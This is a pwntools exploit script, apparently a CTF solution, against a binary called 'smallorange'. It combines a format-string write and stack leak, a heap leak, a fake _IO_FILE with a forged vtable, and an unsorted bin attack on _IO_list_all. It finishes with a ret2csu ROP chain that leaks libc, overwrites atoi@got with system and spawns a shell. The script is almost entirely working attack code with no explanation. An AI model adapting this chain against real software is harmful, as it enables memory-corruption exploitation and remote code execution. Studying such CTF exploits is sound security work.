from pwn import *
context.log_level = "debug"
p = process("./smallorange")
elf = ELF("./smallorange")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# modify read_size to 0x22a0
fmt_payload = "a" * 0x23 + "%19$n"
p.sendlineafter("ourselves\n" , fmt_payload)
p.recvuntil("a" * 0x23)
leak_stack = u64(p.recv(6).ljust(8 , "\x00"))
log.info("leak stack :" + hex(leak_stack))
p.recvuntil("heap addr:")
leak_heap = eval(p.recvuntil("\n" , drop = True))
log.info("leak heap : " + hex(leak_heap))

cmd = lambda c : p.sendlineafter("choice:" , str(c))
def new(content):
	cmd(1)
	p.sendafter("text:\n" , content)

def free(index):
	cmd(2)
	p.sendlineafter("index:\n" , str(index))

# unsorted bin addr get
new("fantasy") # 0
fake_IO_FILE = p64(0) * 2 
fake_IO_FILE += p64(2) + p64(3) # for _io_write_ptr > _io_write_base
fake_IO_FILE += p64(0) * (9 + 1 + 9)  
fake_IO_FILE += p64(0) + p64(0) # fp->_mode = 0 
fake_IO_FILE += p64(leak_heap + (0x100 + 0x110 + 0x110 + 0x10 + 0x30)) # vtable addr
new(fake_IO_FILE) # 1 #
fake_vtable = "a" * 0x30 + p64(0) * 3 + p64(elf.symbols["edit"]) # __overflow
new(fake_vtable) # 2
free(0)
free(1)
io_list_all = 0x00007ffff7a0d000 + libc.sym["_IO_list_all"] - 0X10
new("a" * 0x100 + p64(leak_stack - 0x549 + 8) + p64(0x61) + "p" * 8 +  p64(io_list_all)[:2]) # unsorted bin attack
# gdb.attach(p , "b *0x400B59")
# pause()
cmd(1)
p.sendlineafter("index:\n", "0")

def csu_init( addr_target_fuc_got , arg_1 , arg_2 , arg_3):
	addr_init = 0x400C9A 
	addr_call = 0x400C80 

	payload   	=   p64(addr_init) + p64(0) + p64(1) + p64(addr_target_fuc_got) + p64(arg_3) + p64(arg_2) + p64(arg_1) 
	payload 	+=	p64(addr_call) + 'a' * 56 

	return payload
pop_rdi = 0x400ca3
bss_temp = 0x6020C0
# leak libc && modify *atoi@got to system && atoi("/bin/sh") 
payload = p64(pop_rdi) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
payload += csu_init(elf.got["read"] , 0 , elf.got["atoi"] ,0x8)
payload += p64(elf.symbols["out"])
p.send(payload)
puts_addr = u64(p.recv(6).ljust(8 , "\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.info("libc_base : " + hex(libc.address))
p.send(p64(libc.symbols["system"]))
p.sendlineafter("index:\n" , "/bin/sh")

p.interactive()



